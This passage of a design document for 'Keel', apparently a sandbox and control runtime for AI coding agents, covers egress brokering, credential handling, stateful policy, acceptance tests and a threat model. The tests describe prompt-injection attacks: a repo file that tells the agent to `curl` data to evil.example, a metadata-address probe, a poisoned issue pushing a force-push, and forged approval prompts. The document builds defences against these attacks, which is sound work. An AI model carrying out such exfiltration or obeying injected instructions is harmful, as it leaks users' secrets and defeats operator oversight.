closed. Start emission failing is fatal to the run: a boundary set that cannot be
recorded is a boundary set nobody can check. `detail` carries shapes only — host
names, counts, ceilings — and goes through the same redactor as every other record.

Two prohibitions, both load-bearing:

- **Never rendered into the guest, and no `keel_status` MCP tool.** Scope inside the
  vertex is an instruction, never a claim about the environment (`ARCHITECTURE.md`
  §10). A guest that can read which boundaries are up learns which to probe.
- **Never a decision input.** No `violations` path reads it (I6). It is an
  observation of the decision machinery, not a fact within it.

`keel status SESSION` authenticates the chain before printing anything and leads with
what is *not* fully enforced, because that is the only line an operator needs to read
quickly. A chain that no longer verifies produces an error, not a reassuring summary.

---

## 8. Egress and secrets

### 8.1 Guest networking (D11)

- Vertex has no default route. A guest-side stub (untrusted, in the base image) provides: a resolver answering every name with `10.0.0.1`; a TCP forwarder on `10.0.0.1:443/80` that bridges to the vsock. `HTTPS_PROXY` also set as fallback for tools that prefer it.
- `keel-conn` (untrusted host) accepts the vsock stream, reads the ClientHello SNI (or the CONNECT host), and hands the raw socket plus SNI to `keel-secrets`.
- The egress broker handshake is two-stage. A complete V2 request receives a non-authorizing `P` within five seconds only after it acquires the serialized adjudication slot; queued requests have no `P` and no active human-decision clock. The relay then waits up to five minutes for terminal `A`, `D`, or `E`. The trusted gate expires at 4 minutes 45 seconds so a denial reaches the client before its outer deadline. An expired gate rejects late operator input and clears the pending trusted UI. Peer hangup cancels a still-pending decision; cancellation is checked again around execution and before grant creation, but cannot roll back an effect already in flight.
- `keel-secrets` (trusted) terminates TLS with a cert minted under the Keel MITM CA (CA installed in the guest trust store at image build), resolves the SNI host **kernel-side**, submits `Asserted { class: Egress, target: {host, ip, method, path} }` to the PDP, and on allow opens the upstream TLS connection to the resolved IP (no re-resolution → no rebinding window).
- Before any allow: deny `169.254.0.0/16`, `fd00::/8`, RFC1918, loopback, and link-local, regardless of policy. Hardcoded in `keel-secrets`, not in Cedar (I11 class).
- Empty allowlist = deny all. No allow-all.

### 8.2 Sentinel swap

- Guest holds sentinels (`keel-sentinel-<id>`). `keel-secrets` swaps to real values after the PDP allow, keyed on the resolved connection target, scoped by `(host, method, path-prefix)`. Never on a guest-controlled `Host` header.
- Audit redaction covers sentinel and real forms, and the OAuth refresh token (which never leaves `keel-secrets`).
- A configured credential's host joins the run's egress intent from the same validated value the swap is scoped to, so there is no second reader that could disagree about it. Mediating a push means the trusted relay opens its own connection to the remote, and a capability never gates the transport it cannot work without: `push:branch` is self-sufficient, and the operator does not name the git host again as an allowed egress host. Private smart-HTTP negotiation authenticates only the selected repository's receive-pack advertisement as an inspected-egress protocol preflight, followed by the separately authorized receive-pack POST. The model endpoint and the GitHub API under `pr:create` or `github:read-private-issues` are in the intent on the same grounds.

### 8.3 Model endpoint rules

A run has exactly one model provider, chosen host-side in the trusted process and
named nowhere the guest can reach. The admitted endpoints are a closed table keyed on
the *host only* — the port and forbidden-address checks stay in the sanitizer, because
an endpoint table that answered "not a model host" for a forbidden-IP
`api.anthropic.com` would forward that request unsanitized.

| Provider | Host | Admitted | Selected by |
|---|---|---|---|
| Anthropic | `api.anthropic.com` | `POST /v1/messages` | `ANTHROPIC_API_KEY` |
| Bedrock | `bedrock-runtime.{region}.amazonaws.com` | `POST /model/{id}/invoke`, `/invoke-with-response-stream` | `AWS_BEARER_TOKEN_BEDROCK`, or `KEEL_MODEL_PROVIDER=bedrock` — either with `AWS_REGION` |

The bearer token wins when both are set, and the credential for the provider the run
did not select is left unbound rather than bound and unreachable: a run holding a live
key for a host outside its own egress intent is one allowlist mistake away from having
two budgets and one log. The bearer token selects its provider on its own because that
variable exists for nothing else; `SigV4` credentials do not, because routing a run's
model traffic somewhere else on the strength of an ambient `AWS_ACCESS_KEY_ID` would be
a provider switch nobody asked for.

Bedrock authenticates two ways, and only one of them is a swap (D17). With a bearer
token, the sentinel is substituted as in §8.2. Without one, the request is **signed**:
the guest's `Authorization` header is dropped, not replaced in place, and rewritten as
`AWS4-HMAC-SHA256` along with `x-amz-date`, `x-amz-security-token`, and any payload hash
the guest supplied. The signing credential is resolved host-side before the VM boots —
from the environment, or by running the operator's `KEEL_AWS_CREDENTIAL_PROCESS` command
and re-running it within 120s of expiry, which is how Identity Center sessions refresh
without an SSO implementation inside the TCB.

For either host:

- Credential scope: the admitted methods and paths above only. `/v1/files`, `/v1/messages/batches`, `/v1/organizations/*`, any other Bedrock operation, everything else → deny with audit.
- Request body rewriting in `keel-secrets`: strip any `tools[]` entry whose `type` starts with `web_search`, `web_fetch`, `computer`, `bash`, `text_editor` (server-side variants), strip `mcp_servers`, strip `container`. Log the strip. If the harness breaks without them, that is a finding, not a reason to allow.
- Bedrock additionally asserts its own wire contract: an `anthropic_version` other than `bedrock-2023-05-31` is refused here, naming the contract, rather than surfacing as an upstream 400 the harness reports as a network failure.
- The kernel enforces cumulative per-run token and cost ceilings, defaulting to 1,000,000 tokens and $10. The CLI may request narrower values directly; either ceiling above its trusted default expands authority and requires foreground trusted-terminal admission, whose screen displays both exact limits. Before forwarding, trusted TLS custody reserves the sanitized request byte length as a conservative input-token upper bound plus `max_tokens`, using pinned conservative tariffs. The model identifier comes from the body for Anthropic and from the path for Bedrock, whose tariffs are keyed `(region, model)` and pinned for `us-east-1`, `us-east-2`, and `us-west-2`; base, US cross-region, and global Anthropic inference-profile prefixes are separate accepted keys. A pinned run model is checked against that table before guest boot. Unknown request model identifiers, unpinned regions, missing limits, or exhausted budgets deny before upstream application bytes.
- Each reservation starts `authorized-unsent` and becomes `send-attempted` immediately before trusted TLS custody writes the first upstream application byte. Only the former state can be released. Trusted JSON, SSE, or `application/vnd.amazon.eventstream` usage from a complete successful response settles actual use and is written to the authenticated audit chain. Where a provider reports its own counts alongside the events it relays, the two accounts settle at the **larger** (D16). A disconnect, timeout, non-success response (regardless of a usage-shaped body), or missing or malformed usage after send fails closed and records a terminal conservative charge; no post-send path infers a refund from connection failure.
- Response body is not classified (§6.2).

### 8.4 Harness credential (D5)

OAuth: sentinel token in guest; kernel refreshes proactively and rewrites the guest-visible credential file over vsock before expiry. Only the kernel may refresh. API-key mode: sentinel only.

---

## 9. Stateful policy (contribution 3)

### 9.1 Facts

```
files_created_by_this_vertex : set<path>
files_written_by_this_vertex : set<path>
hosts_contacted              : set<host>
registries_contacted         : bool
writes_last_60s              : u32
distinct_files_written_60s   : u32
denied_actions               : u32
selected_denial_scope        : opaque digest
recent_behavioral_denials_in_scope : u32
escalated_actions            : u32
floor                        : u8
floor_history                : [(rank, source, ts)]
sources_read                 : set<SourceRef>
intent                       : IntentFlags   (§9.2)
```

Rules required in Phase 2 (each is an acceptance test):
1. Escalate writes to files this vertex did not create, once `distinct_files_written_60s ≥ 20`.
2. After `registries_contacted`, escalate all writes.
3. After three behavioral denials of the same canonical action scope within 15 minutes, escalate that scope for review. Resource/provider/budget failures do not count; approval of this rule clears only the reviewed scope. `denied_actions` remains a cumulative audit statistic.
4. Escalate any push if `sources_read` contains a `Host` not in `own_domains`.
5. Auto-allow push-to-branch only if `intent.allow_push_branch`.

Cedar must receive these as context attributes on the request; the kernel must not evaluate the predicate in Rust and pass a boolean. Phase 0 proves rules 1, 3, 4 in Cedar.

### 9.2 Intent (revised)

No keyword matching on free text. Intent is structured, supplied at launch through `keel-input`:

```
keel run --allow push:branch --allow pr:create \
  --allow github:read-private-issues --allow egress:docs.rs claude
```

Flags populate `IntentFlags`; they can widen auto-allow for actions that are otherwise `log+alert`, never for `✅` gated actions. Free-text typed input is rank-3 *data* for the guest, not policy input.

---

## 10. Phases

Single builder, nights and weekends, model-assisted implementation. Estimates are honest, not aspirational.

### Phase 0 — Prove the substrate (weeks 1–2)

Tasks:
- Cargo workspace; trusted/untrusted split; I1–I4 in CI from commit one.
- Spike A: boot a microVM on macOS (libkrun, then Virtualization.framework) and on Linux (cloud-hypervisor). Run a process. Vsock or UDS from guest to host.
- Spike B: `rmcp` server + client over the vsock transport.
- Spike C: transparent egress — guest stub resolver + forwarder → host `keel-conn` → SNI extraction → `rustls` MITM with a test CA → upstream. Measure: does `curl`, `git`, `npm`, `cargo`, and the harness binary work unmodified? Which need `HTTPS_PROXY`?
- Spike D: Cedar with three stateful rules (§9.1 rules 1, 3, 4) with facts as context entities. Automated permissiveness analysis runs on the bundle.
- Spike E: exclusive raw tty ownership in the trusted runtime, with guest PTY output transformed by a renderer that has no tty file descriptor. Prove the harness TUI renders and that the secure-attention chord enters an exclusive trusted screen while guest frames are dropped; do not finish the approval UI.
- Two-sided preflight: in-guest assertion + host-side verification of no route / no DNS / no metadata / no RFC1918.

Acceptance:
- [x] Vertex boots on the chosen primary platform; a guest process calls one tool via MCP over vsock.
- [x] Preflight passes from both sides; a deliberately broken image fails the host-side check.
- [x] Spike C table filled in: which tools work transparently, which need proxy-env, which fail.
- [x] Spike D: three rules pass their scenarios; a fourth rule expressed as a pre-digested boolean is rejected in review.
- [x] **D1 and D9 resolved in writing.** macOS Virtualization.framework gives VM-per-vertex + vsock, so build Keel.

### Phase 1 — Node contract (weeks 3–7)

Tasks, in dependency order:
1. `keel-kernel`: `Asserted`/`Stamped`/`Action`, channel registry (I8), pipeline `receive → verify principal → stamp → evaluate → rank check → budget → [gate] → inject → execute → audit`, session state, budgets, loop detection.
2. `keel-policy`: Cedar load from content-hashed artifact (I10), violations-set, argument role classification, symlink-aware real-path containment.
3. `keel-audit`: hash chain, per-record HMAC keyed on `(run_key, seq)`, single writer task, offline verifier binary, redaction.
4. `keel-secrets`: custody types (`!Serialize`, zeroize), MITM CA, TLS termination, kernel-side resolution, hardcoded deny ranges, sentinel swap, model-endpoint rules (§8.3), OAuth refresh.
5. `keel-conn`: vsock accept, SNI peek, socket handoff.
6. `keel-input`: exclusive tty ownership, keystroke classification, secure-attention chord, trusted approval mode, safe gate rendering, direct synchronous decision return.
7. `keel-kernel::gate`: exact-action lifecycle, cancellation/expiry, bounded grants, and gate rendering payload (exact diff/command/recipient).
8. `keel-gitd`: smart HTTP server on vsock, kernel-side mirror, ref-update parsing, flags computation, PDP call, real push after allow.
9. `keel-render`: guest PTY frame producer over IPC, with no real-tty file descriptor or approval path.
10. `keel-cli`: `keel run`, `keel audit verify`, `keel floor show`.
11. Base image build script: harness preinstalled, CA installed, stub resolver + forwarder, `origin` rewrite at boot.
12. Gate instrumentation (§7.4).

Acceptance:
- [ ] `keel run claude` on a real repo: read, test, edit, commit, push a branch through `keel-gitd`, open a PR via MCP. Every consequential action in the audit log; `keel audit verify` passes; a tampered record fails.
- [x] Force-push attempt via `git push -f`, `git push origin +main`, and a `.git/config` alias all reach the PDP as `GitPush{is_force:true}` and escalate. (Three tests, one code path.)
- [x] A push touching `Cargo.toml` escalates; the gate shows the manifest diff.
- [x] Injection in a repo file instructs `curl https://evil.example/x?…`: the request reaches `keel-secrets`, the PDP denies (host not allowlisted), audit records it. Also: `curl http://169.254.169.254/` denied before policy.
- [x] A request from the vertex to `api.anthropic.com/v1/files` is denied; a `/v1/messages` request with a `web_search` tool has it stripped and logged.
- [x] Real credential never appears in the vertex filesystem, transcript, or audit log (grep test on all three, both sentinel and real forms).
- [x] Secure-attention returns a direct decision for the exact pending action; stale, late, canceled, or reused input cannot authorize another action, and a disconnected caller cannot leave a reusable grant behind. An effect already in flight cannot be rolled back.
- [x] A guest emits a fake approval prompt, approval-like keystroke instructions, bracketed paste, and terminal escape sequences. None can enter trusted approval mode, alter its rendered payload, or approve an action. Renderer output attempted during trusted mode is not written to the tty.
- [x] I1–I11 green. Zero `unsafe`. TCB under budget.
- [ ] Criterion 2 check: a week of voluntary daily use. Record: did you reach for the unwrapped binary, and why.

### Phase 2 — Provenance and stateful policy (weeks 8–11)

Tasks:
1. `SessionFacts` grows to §9.1; kernel maintains all facts; Cedar receives them as context.
2. `keel-provenance`: full classification table (§6.2) with startup failure on an unclassified result type; fail-closed workspace/history classification; write-inheritance; floor in live kernel state; both modes (§6.3); non-authoritative shutdown snapshots (§6.5).
3. Rank check step in the pipeline → escalate on shortfall, with `floor_history` in the gate payload.
4. `keel floor lift` as a gated operator action.
5. Structured intent flags (§9.2).
6. Rules 1–5 (§9.1) as shipped default policy.
7. Escalation fatigue instrument reporting (`keel report`).

Acceptance:
- [ ] Primary scenario, live: agent reads a poisoned issue (via `gh` MCP), attempts force-push; escalates; gate shows the issue as the rank-0 source and the rule; operator denies; audit shows read → floor drop → attempt → rule → denial.
- [x] P3: agent writes injected content to a file at floor 0, re-reads it; class is 0; floor does not rise.
- [x] Re-reading a file written at floor 3 does not lower the floor below 3.
- [x] `--continue` into a new broker starts at rank 0 and cannot import authority from unsigned persisted state.
- [x] Compaction in the harness does not change the floor.
- [x] Rules 1–5 each have a passing scenario and a passing negative scenario.
- [x] `gate-context` mode: same primary scenario; the push gate renders the same `floor_history`; no rank check ran.
- [ ] One week of usage data per mode: escalations/task, floor lifts/task, < 2s approval fraction.

### Phase 3 — Evaluation and write-up (weeks 12–15)

Tasks:
- Attack suite (~25) and benign suites for Examples A and B with model-independent completion criteria (tests pass, PR opened, document produced).
- Vertex fork implementation (D4c) sufficient for the comparison.
- Matrix in §11, one command.
- Write-up: addendum to `../paper/`. Cite IronCurtain as prior art for the node contract; claim only the TCB thesis, native isolation, and the measured provenance results.
- OSS release only if the numbers hold: Apache-2.0, threat model and residuals first.

Acceptance:
- [ ] Matrix filled, including cells where Keel loses.
- [ ] Any control that blocks nothing its neighbours miss is deleted, and the deletion is in the changelog.

### Deferred or excluded from this plan

**Policy compiler and differential Rego oracle: restored by D26.** The original v0.2 contribution was deferred while the runtime boundaries were built. It is now implemented as an offline, restriction-only compiler with Cedar/Rego/Rust differential verification and an independently hash-pinned runtime bundle. Natural-language fidelity remains an explicit operator review step.

**Second-terminal and web approval UIs.** Phase 1 uses the exclusive trusted-terminal mode in §7.2. A web UI may be revisited only with WebAuthn bound to the action target hash.

---

## 11. Evaluation matrix

| | No runtime | Policy only | Policy + stateful | + provenance `gate-context` | + provenance `floor` | Vertex fork |
|---|---|---|---|---|---|---|
| Attack suite — blocked | | | | | | |
| Benign A — completion | | | | | | |
| Benign B — completion | | | | | | |
| Escalations / task | | | | | | |
| Floor lifts / task | — | — | — | — | | — |
| Floor false positives | — | — | — | — | | — |
| < 2s approval fraction | | | | | | |
| Overhead (latency, tokens) | | | | | | |

The result worth having is which column is load-bearing per attack and what it costs on the benign suites. Expected: `floor` loses on B; `gate-context` retains most of the attack coverage at lower escalation load; whether fork beats both is open.

---

## 12. Threat model additions (append to `THREAT-MODEL.md`)

| # | Threat | Control |
|---|---|---|
| N21 | Model API Files/Batches endpoints as exfiltration | Credential path-scoped to `POST /v1/messages`; other paths denied (§8.3) |
| N22 | Server-side tools (`web_search`, `mcp_servers`) in model requests bypass egress | Request-body stripping in `keel-secrets` (§8.3) |
| N23 | Git config, aliases, `push.default`, `+ref` syntax defeat command parsing | No command parsing; `keel-gitd` reads ref updates on the wire (§7.3) |
| N24 | Forged operator input or approval via the untrusted PTY path | `keel-input` exclusively owns the tty; secure-attention approval pauses guest input and discards complete untrusted snapshots while the trusted view owns the screen (§7.2, I9) |
| N25 | Real credential or CA key exposed to an untrusted host crate | TLS termination and injection inside `keel-secrets` (I7) |
| N26 | Resumed session forgets prior floor | Floor persisted per harness session id (§6.5) |
| N27 | Free-text intent matched by keyword ("don't push") | Structured intent flags only (§9.2) |

Residuals to add: exfiltration to the model endpoint itself is lawful output;
the first-party LOC cap does not bound dependency surface; and the scalar
session floor cannot yet represent the precise content present in one model
turn. Git author text is retained only as informational metadata and never
raises provenance rank.

---

## 13. Kill criteria

- Phase 0: no macOS backend gives VM-per-vertex + vsock without heroics **and** Linux-primary means you will not use it daily → stop, contribute upstream.
- Phase 1: trusted growth cannot stay within the declared ceiling → reconsider the thesis instead of quietly moving it. D17 raised the working allocation to 12,700 for implemented `SigV4` and Identity Center support. D29 established a 14,000 hard ceiling; D30 assigned isolation admission, D31 and D32 assigned the security-review remediations, D33 assigned authenticated foreground mux attachment, and D34–D38 recorded later reallocations. D39 explicitly reconsidered the cap and raised it to 16,000 for three measured cross-cutting security guarantees. Further trusted growth requires reallocation or another explicit reconsideration of the small-reviewable-kernel claim.
- Phase 1: after one week you reach for the unwrapped binary more than once a day → fix usability before Phase 2; if unfixable in two weeks, stop.
- Phase 2: `floor` mode breaks benign B beyond recovery **and** `gate-context` or fork is strictly better → publish that; ship without the floor.
- Any phase: exclusive tty ownership or secure-attention takeover cannot be proved on the chosen platform → stop; the approval path does not satisfy I9.

---

## 14. Changes from v0.2 (index for updating the other docs)

| Doc | Change |
|---|---|
| ARCHITECTURE §1 | `keel-egress` → `keel-conn` (untrusted) + TLS/injection in `keel-secrets` (trusted). `keel-pty` → `keel-input` (trusted, sole tty owner) + `keel-render` (untrusted frame producer, no tty fd). Add `keel-gitd`; D26 later restores `keel-compile` outside the TCB. |
| ARCHITECTURE §2 | Budget 10.4k → 12k; add `keel-input`; state "first-party LOC". |
| ARCHITECTURE §5 | Pipeline: rank check escalates, never denies. |
| ARCHITECTURE §6 | Add classification table (§6.2 here); `agent_derived = min(1, writer floor)`; own-output re-read rule; two modes; resume persistence; read-set. |
| ARCHITECTURE §6 table | push-to-branch 1 → 0 log+alert; "add dependency" → "push touching manifest" rank 2 gated; add lift-floor row. |
| ARCHITECTURE §7 | Intent is structured flags, not text match. Add `sources_read`, `floor_history`, `intent` facts. |
| ARCHITECTURE §8 | Approval uses an exclusive trusted-terminal takeover via a reserved secure-attention chord; remove the second-terminal UDS and inline overlay designs. |
| ARCHITECTURE §9 | D26 restores the compiler as an offline, restriction-only Cedar/Rego pipeline outside the TCB. |
| THREAT-MODEL | Add N21–N27 and three residuals. Phase 1 exit test for injection restated as PDP denial at the proxy, not "no route". |
| PROJECT-BRIEF | Contribution 5 was deferred, then restored by D26. Contribution 2 reframed: "kernel-side provenance accounting, with floor and gate-context modes measured against each other." Risk list: add TCB-boundary-for-secrets and input-path. |
| ROADMAP | Five phases → four; 10 weeks → ~15; D26 restores the compiler in the current Phase 3 status; PTY overlay deferred; D9 moved to Phase 0 exit. |
| DECISIONS | D1 conditional on spike; D2 Rego oracle deferred; D5 path scope; D7 → four ranks + read-set; D9 decided at Phase 0 exit; add D10–D13. |
